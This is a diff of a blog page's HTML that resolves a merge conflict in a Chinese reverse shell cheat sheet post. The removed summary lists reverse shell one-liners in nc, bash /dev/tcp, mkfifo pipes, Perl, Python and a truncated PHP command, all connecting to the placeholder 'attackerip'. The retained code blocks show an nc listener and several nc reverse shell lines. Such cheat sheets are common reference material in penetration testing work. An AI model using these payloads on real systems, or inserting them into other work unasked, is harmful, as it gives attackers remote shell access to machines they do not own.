@@ -127,9 +127,6 @@
         <span><ion-icon name="today"></ion-icon>&nbsp;2020-06-30</span><span><ion-icon name="file-tray"></ion-icon>&nbsp;149 字</span><span><ion-icon name="pricetags"></ion-icon>&nbsp;<a href="/tags/shell">Shell</a>&nbsp;<a href="/tags/cheatsheet">CheatSheet</a>&nbsp;</span>
     </div>
     <div class="post-item post-summary markdown-body">
-<<<<<<< HEAD
-        利用 nc 监听端口 nc -lvp 2333 nc 版本： nc -e /bin/sh attackerip 2333 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 2333 &gt;/tmp/f nc attackerip 8888|/bin/sh|nc attackerip 9999 Bash 版本： bash -i &gt;&amp; /dev/tcp/attackerip/2333 0&gt;&amp;1 bash -i &gt;&amp; /dev/tcp/attackerip/2333 &lt;&amp;2 exec 5&lt;&gt;/dev/tcp/attackerip/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 mknod backpipe p; nc attackerip 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe Perl 版本: perl -e 'use Socket;$i=&quot;attackerip&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' Python 版本： python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' php 版本： php -r '$sock=fsockopen(&quot;attackerip&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3
-=======
         <h2 id="利用-nc-监听端口">利用 nc 监听端口</h2>
 <pre><code class="language-bash">nc -lvp 2333
 </code></pre>
@@ -140,7 +137,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip 2333 &gt
 
 nc attackerip 8888|/bin/sh|nc attackerip 9999
 </code></pre>
->>>>>>> f00a4d10143bda514c4168bf395f69705a632acc
     </div>
 </div>
 
